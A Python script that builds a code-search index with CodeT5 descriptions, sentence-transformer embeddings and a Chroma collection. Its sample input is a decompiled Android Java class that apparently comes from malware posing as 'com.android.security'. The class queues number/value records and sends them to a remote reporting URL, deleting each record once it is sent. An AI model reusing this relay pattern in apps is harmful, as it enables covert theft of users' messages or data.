from chromadb import Client
from transformers import AutoTokenizer, AutoModelForSeq2SeqLM

# 初始化 Chroma 向量数据库
chroma_client = Client()
collection = chroma_client.create_collection("code-index")

# 加载 Hugging Face 预训练模型和 tokenizer
tokenizer = AutoTokenizer.from_pretrained("Salesforce/codet5-base")
model = AutoModelForSeq2SeqLM.from_pretrained("Salesforce/codet5-base")

# 使用 Hugging Face 的 CodeT5 模型生成代码描述
def generate_code_description(code_snippet):
    inputs = tokenizer(
        f"Describe the following code and its methods in detail: {code_snippet}", 
        return_tensors="pt", 
        max_length=512, 
        truncation=True
    )
    
    # 增加调试信息
    try:
        summary_ids = model.generate(
            inputs.input_ids, 
            max_length=150,  # 控制生成的描述长度
            num_beams=4, 
            early_stopping=True
        )
        description = tokenizer.decode(summary_ids[0], skip_special_tokens=True)

        # 打印生成的描述
        print(f"Generated description: {description}")

        return description
    except Exception as e:
        # 捕获可能的错误并输出
        print(f"Error generating description: {e}")
        return ""


# 获取文本的嵌入向量
def get_text_embedding(description):
    # 使用适当的嵌入模型，例如 Hugging Face 的 sentence-transformers
    from sentence_transformers import SentenceTransformer
    embedder = SentenceTransformer('sentence-transformers/all-MiniLM-L6-v2')
    embedding = embedder.encode(description)
    return embedding

# 存储代码和描述
def store_code_embedding(code_snippet):
    description = generate_code_description(code_snippet)
    embedding = get_text_embedding(description)

    # 将嵌入从 ndarray 转换为 list
    embedding_list = embedding.tolist()  # 将 numpy 数组转换为 Python 列表

    # 将原始代码和描述存为元数据
    metadata = {
        "code": code_snippet,
        "description": description
    }
    unique_id = str(hash(code_snippet))

    # 将嵌入和元数据添加到 Chroma 数据库
    collection.add(ids=[unique_id], embeddings=[embedding_list], metadatas=[metadata])


# 示例代码片段存储
code_snippet = """
package com.android.security;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteStatement;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class DataStorage {
    private static final String DATABASE_NAME = "secsuite.db";
    private static final int DATABASE_VERSION = 1;
    private static final String INSERT = "insert into delay_data(number,value) values (?,?)";
    private static final String TABLE_NAME = "delay_data";
    private Context context;
    private SQLiteDatabase db = new OpenHelper(this.context).getWritableDatabase();
    private SQLiteStatement insertStmt = this.db.compileStatement(INSERT);

    public DataStorage(Context context2) {
        this.context = context2;
    }

    public int SendSavedMessages() {
        SQLiteDatabase sQLiteDatabase = this.db;
        String[] strArr = new String[3];
        strArr[0] = "id";
        strArr[DATABASE_VERSION] = "number";
        strArr[2] = "value";
        Cursor cursor = sQLiteDatabase.query(TABLE_NAME, strArr, (String) null, (String[]) null, (String) null, (String) null, "id asc");
        int Result = 0;
        if (cursor.moveToFirst()) {
            while (WebManager.MakeHttpRequest(ValueProvider.GetMessageReportUrl(cursor.getString(DATABASE_VERSION), "/SQL/" + cursor.getString(2))) == 200) {
                Result += DATABASE_VERSION;
                SQLiteDatabase sQLiteDatabase2 = this.db;
                String[] strArr2 = new String[DATABASE_VERSION];
                strArr2[0] = cursor.getString(0);
                sQLiteDatabase2.delete(TABLE_NAME, "id=?", strArr2);
                if (!cursor.moveToNext()) {
                    break;
                }
            }
        }
        if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }
        return Result;
    }

    public long insert(String Number, String Value) {
        this.insertStmt.bindString(DATABASE_VERSION, Number);
        this.insertStmt.bindString(2, Value);
        return this.insertStmt.executeInsert();
    }

    public void deleteAll() {
        this.db.delete(TABLE_NAME, (String) null, (String[]) null);
    }

    public List<String> selectAll() {
        List<String> list = new ArrayList<>();
        SQLiteDatabase sQLiteDatabase = this.db;
        String[] strArr = new String[2];
        strArr[0] = "number";
        strArr[DATABASE_VERSION] = "value";
        Cursor cursor = sQLiteDatabase.query(TABLE_NAME, strArr, (String) null, (String[]) null, (String) null, (String) null, "id desc");
        if (cursor.moveToFirst()) {
            do {
                list.add(cursor.getString(0));
                list.add(cursor.getString(DATABASE_VERSION));
            } while (cursor.moveToNext());
        }
        if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }
        return list;
    }

    private static class OpenHelper extends SQLiteOpenHelper {
        OpenHelper(Context context) {
            super(context, DataStorage.DATABASE_NAME, (SQLiteDatabase.CursorFactory) null, DataStorage.DATABASE_VERSION);
        }

        public void onCreate(SQLiteDatabase db) {
            db.execSQL("CREATE TABLE delay_data(id INTEGER PRIMARY KEY AUTOINCREMENT, number TEXT not null , value TEXT not null)");
        }

        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            Log.w("Example", "Upgrading database, this will drop tables and recreate.");
            db.execSQL("DROP TABLE IF EXISTS delay_data");
            onCreate(db);
        }
    }
}

"""
store_code_embedding(code_snippet)

# 检索相关代码
def retrieve_similar_code(query):
    query_embedding = get_text_embedding(query)
    
    # 将 query_embedding 从 ndarray 转换为 list
    query_embedding_list = query_embedding.tolist()  # 将 numpy 数组转换为 Python 列表
    
    # 使用 Chroma 数据库检索相似代码
    results = collection.query(query_embeddings=[query_embedding_list], n_results=1)

    return results


# # 示例查询
# query = "class primarily responsible for handling local storage, retrieval, and transmission of data, including removing transmitted data upon successful transmission."
# results = retrieve_similar_code(query)

# # 显示结果
# # 显示结果
# for result in results['metadatas'][0]:  # 修改为通过索引访问第一个结果
#     print(f"Description: {result['description']}")
#     print(f"Code: {result['code']}")